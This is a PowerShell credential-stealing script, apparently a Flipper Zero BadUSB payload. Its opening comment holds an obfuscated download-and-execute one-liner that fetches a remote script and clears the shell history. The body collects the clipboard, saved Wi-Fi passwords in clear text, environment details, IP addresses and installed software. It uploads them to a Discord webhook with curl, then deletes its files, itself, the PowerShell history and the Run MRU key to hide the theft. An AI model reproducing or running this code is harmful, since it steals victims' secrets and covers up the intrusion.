#Payload to execute in your flipperZero: this dowload, execute and clear history
#$n='i';set-alias v $n'wr';$b=[char]116;$c=[char]47;$a=$([char]104+$b+$b+[char]112+[char]58+$c+$c);IEX (v -usebasicparsing $a'raw.githubusercontent.com/s4dic/DiscordGrabber/main/bd.ps1?token=GHSAT0AAAAAABXCYHCCGGWFF43MHDED24HEYXT6JBQ'); PSReadLine; [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory(); exit

#Todo:
# Correct the Edge password error

#CHANGE URL TO YOUR URL
  $url="https://discord.com/api/webhooks/1241627098708316282/hCxQZ_WDJjP0dzR2a2cbEtQVREYiz7LluJe6aK-tpYY4QL5nDwXtRUJEcDpOsh9H2uFW" ;
#Get PC Name+Date+Time
  $namepc = Get-Date -UFormat "$env:computername-$env:UserName-%m-%d-%Y_%H-%M-%S"

# Get PC ClipBoard
  echo "" > "$env:temp\stats-$namepc.txt";
  echo "   PC ClipBoard:" >> "$env:temp\stats-$namepc.txt";
  echo "__________________________" >> "$env:temp\stats-$namepc.txt";
  Get-Clipboard >> "$env:temp\stats-$namepc.txt";
  echo "__________________________" >> "$env:temp\stats-$namepc.txt";

# Get WifiPassword
echo "" > "$env:temp\WIFI-$namepc.txt";
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | out-file "$env:temp\WIFI-$namepc.txt";


# Get PC information
  dir env: >> "$env:temp\stats-$namepc.txt";
# Get public IP
  $pubip = (Invoke-WebRequest -UseBasicParsing -uri "http://ifconfig.me/").Content
  echo "PUBLIC IP: $pubip" >> "$env:temp\stats-$namepc.txt";
# Get Local IP
  ipconfig /all >> "$env:temp\stats-$namepc.txt";
# List all installed Software
  echo "Installed Software:" >> "$env:temp\stats-$namepc.txt";
  Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize >> "$env:temp\stats-$namepc.txt";
  Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize >> "$env:temp\stats-$namepc.txt";



#UPLOAD
cd $env:temp
# Send Name Computer to discord
  $Body=@{ content = "**STATS ON USER: ** $env:UserName, **ON PC:**  $env:computername"};
  Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
# Upload Stat
  curl.exe -F "file1=@stats-$namepc.txt" $url;
# Upload wifi password
  curl.exe -F "file2=@WIFI-$namepc.txt" $url;


#Delete all file
# Delete stat
  Remove-Item "stats-$namepc.txt" -Force -Recurse;
# Delete wifi password
  Remove-Item "WIFI-$namepc.txt" -Force -Recurse;
# Delete screenshot
  Remove-Item  $screencapture* -Force -Recurse;
# Delete token screencapture
  Remove-Item  $tokencapture* -Force -Recurse;

# Delete this script
  Remove-Item  $env:temp\p.ps1 -Force -Recurse;
# Delete screencapture script
  Remove-Item $env:temp\d.ps1 -Force -Recurse;

# Clear History powershell:
  [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();
# Clear run powershell:
  Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
exit;
